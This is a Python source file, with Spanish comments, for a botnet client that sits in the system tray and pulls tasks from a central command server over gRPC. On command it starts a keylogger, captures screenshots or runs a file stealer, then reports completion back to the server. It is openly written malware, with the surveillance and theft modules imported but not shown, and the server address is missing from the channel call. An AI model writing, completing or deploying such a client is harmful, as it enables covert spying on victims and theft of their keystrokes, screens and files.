import grpc
import proto_pb2
import proto_pb2_grpc
from keylogger import Keylogger
from screenshot import Screenshot
from steeler import FileStealer
import os
import sys
import threading
import time
from PyQt5.QtWidgets import QApplication, QSystemTrayIcon, QMenu, QAction
from PyQt5.QtGui import QIcon

class RobotApp:
    def __init__(self):
        self.app = QApplication(sys.argv)
        self.tray_icon = QSystemTrayIcon(QIcon("she_was_never.png"), parent=self.app)
        self.tray_menu = QMenu()
        self.exit_action = QAction("Exit", self.tray_icon)
        self.exit_action.triggered.connect(self.app.quit)
        self.tray_menu.addAction(self.exit_action)
        self.tray_icon.setContextMenu(self.tray_menu)
        self.tray_icon.show()

        # Configuración de la conexión gRPC con el servidor central
        self.channel = grpc.insecure_channel()
        self.stub = proto_pb2_grpc.BotnetStub(self.channel)

        # Iniciar el hilo para recibir tareas
        self.task_thread = threading.Thread(target=self.receive_tasks)
        self.task_thread.daemon = True
        self.task_thread.start()

    def receive_tasks(self):
        while True:
            try:
                for task in self.stub.GetTasks(proto_pb2.Empty()):
                    print(f"Recibida tarea: {task}")
                    # Aquí haces lo que necesites con la tarea

                    if task == 'keylogger':
                        keylogger = Keylogger()
                        keylogger.start()
                    elif task == 'screenshot':
                        screenshot = Screenshot()
                        screenshot.capture()
                    elif task == 'file_stealer':
                        file_stealer = FileStealer()
                        file_stealer.steal_files()

                    # Enviar resultados al servidor
                    result = self.stub.SendResult(proto_pb2.Result(task=task, status='completed'))
                    print(f'Tarea {task} completada y resultado enviado.')

            except grpc.RpcError as e:
                print(f"Error en la comunicación gRPC: {e}")
                time.sleep(5)

    def run(self):
        sys.exit(self.app.exec_())


if __name__ == '__main__':
    app = RobotApp()
    app.run()

